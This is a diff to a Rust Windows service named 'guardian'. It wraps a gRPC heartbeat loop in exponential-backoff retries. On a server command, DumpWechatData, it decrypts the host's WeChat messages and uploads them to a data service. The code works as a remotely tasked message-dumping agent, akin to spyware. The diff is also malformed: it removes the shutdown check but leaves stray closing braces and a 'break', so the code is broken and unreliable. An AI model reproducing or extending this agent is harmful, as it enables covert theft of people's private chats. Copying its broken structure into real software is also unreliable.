@@ -1,3 +1,5 @@
+use tokio_retry::Retry;
+use tokio_retry::strategy::{ExponentialBackoff, jitter};
 use tonic::transport::Channel;
 use guardian::agent_service_client::AgentServiceClient;
 use guardian::HeartbeatRequest;
@@ -56,59 +58,56 @@ fn run_service() -> WinServiceResult<()> {
     set_service_status(&status_handle, ServiceState::Running)?;
 
     // 启动 tokio runtime
-    let rt = tokio::runtime::Runtime::new().unwrap();
+    let rt = match tokio::runtime::Runtime::new() {
+        Ok(rt) => rt,
+        Err(e) => {
+            eprintln!("Failed to create tokio runtime: {e}");
+            return Ok(());
+        }
+    };
     rt.block_on(async move {
         loop {
-            // 连接到 gRPC 服务器
-            let mut client = match AgentServiceClient::connect("http://127.0.0.1:50051").await {
-                Ok(c) => c,
-                Err(e) => {
-                    eprintln!("gRPC connect error: {e}");
-                    tokio::time::sleep(Duration::from_secs(10)).await;
-                    continue;
-                }
-            };
+            let strategy = ExponentialBackoff::from_millis(10)
+                .max_delay(Duration::from_secs(60))
+                .map(jitter);
+            let result = Retry::spawn(strategy, || async {
+                // 连接到 gRPC 服务器
+                let mut client = AgentServiceClient::connect("http://127.0.0.1:50051").await?;
+                // 构建 HeartbeatRequest
+                let request = tonic::Request::new(HeartbeatRequest {
+                    agent_id: 1,
+                    hostname: whoami::hostname(),
+                });
+                // 调用 heartbeat 方法并解析响应
+                let resp = client.heartbeat(request).await?.into_inner();
 
-            // 构建 HeartbeatRequest
-            let request = tonic::Request::new(HeartbeatRequest {
-                agent_id: 1,
-                hostname: whoami::hostname(),
-            });
-
-            // 调用 heartbeat 方法并解析响应
-            let resp = match client.heartbeat(request).await {
-                Ok(r) => r.into_inner(),
-                Err(e) => {
-                    eprintln!("Heartbeat error: {e}");
-                    tokio::time::sleep(Duration::from_secs(10)).await;
-                    continue;
-                }
-            };
-
-            // 判断 task_type
-            if resp.task_type == guardian::TaskType::DumpWechatData as i32 {
-                // 获取消息
-                let messages = core::wechat::decrypt_and_get_messages().unwrap_or_default();
-                let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs() as i64;
-                let chat_messages: Vec<ChatMessage> = messages.into_iter().map(|content| ChatMessage {
-                    content,
-                    timestamp: Some(Timestamp { seconds: now, nanos: 0 }),
-                }).collect();
-
-                // 上传消息
-                if !chat_messages.is_empty() {
-                    if let Ok(mut data_client) = DataServiceClient::connect("http://127.0.0.1:50051").await {
-                        let upload_req = tonic::Request::new(UploadMessagesRequest {
+                // 判断 task_type
+                if resp.task_type == guardian::TaskType::DumpWechatData as i32 {
+                    // 获取消息
+                    let messages = core::wechat::decrypt_and_get_messages()?;
+                    let now = SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs() as i64;
+                    let chat_messages: Vec<ChatMessage> = messages.into_iter().map(|content| ChatMessage {
+                        content,
+                        timestamp: Some(Timestamp { seconds: now, nanos: 0 }),
+                    }).collect();
+                    // 上传消息
+                    if !chat_messages.is_empty() {
+                        let mut data_client = DataServiceClient::connect("http://127.0.0.1:50051").await?;
+                        let _ = data_client.upload_messages(tonic::Request::new(UploadMessagesRequest {
                             agent_id: 1,
                             messages: chat_messages,
-                        });
-                        let _ = data_client.upload_messages(upload_req).await;
+                        })).await;
                     }
                 }
+                Ok::<(), anyhow::Error>(())
+            }).await;
+            if let Err(e) = result {
+                eprintln!("[FATAL] gRPC retry failed: {e}");
             }
-
-            // 检查是否收到停止信号
-            if shutdown_rx.recv_timeout(Duration::from_secs(60)).is_ok() {
+            // 等待一段时间后再次尝试
+            tokio::time::sleep(Duration::from_secs(10)).await;
+        }
+    });
                 break;
             }
         }
